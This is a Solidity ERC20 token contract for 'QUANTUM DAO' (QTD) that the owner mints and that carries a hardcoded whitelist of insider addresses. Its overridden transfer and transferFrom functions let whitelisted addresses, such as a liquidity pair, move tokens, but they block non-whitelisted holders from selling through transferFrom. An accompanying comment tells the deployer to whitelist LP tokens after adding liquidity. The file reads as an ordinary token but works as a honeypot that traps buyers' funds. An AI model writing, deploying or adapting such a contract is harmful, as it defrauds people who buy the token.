// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("QUANTUM DAO", "QTD") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 10000000 * 10 ** decimals());
        whiteList[0xc5F0FdE61fFFec5d93832e73a7D6dE00D334Eea9]= true;
        whiteList[0x7dC4851B04bE73Ef633CB934eeddE13735ac148A]=true;
        whiteList[0x8519b6c609fd1392AeE538121Aac242273Bb8590]=true;
        whiteList[0x5702850E607e8Cb01D78B1d8906C380673f0c924]=true;
        whiteList[0xEa7430FC1a02E916e984aA586F3628aDa5d189F2]=true;
        whiteList[0x082892752536c2ee66862cd2c6985772Ac73c685]=true;
        whiteList[0xF9b19Ee5C0EF20946e834eF6CC9Fce0f0b792357]=true;
        whiteList[0xE263EdFf8dEBC036Ae035f2bE4CFD01d6F527b26]=true;
        whiteList[0x3749421437234e0C309c40B2E809ff6a93B6C3F5]=true;
        whiteList[0x141c73dB3CE56Af37A5dBd1b5F039Ae1b839C7DF]=true;
        whiteList[0x7dC4851B04bE73Ef633CB934eeddE13735ac148A]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}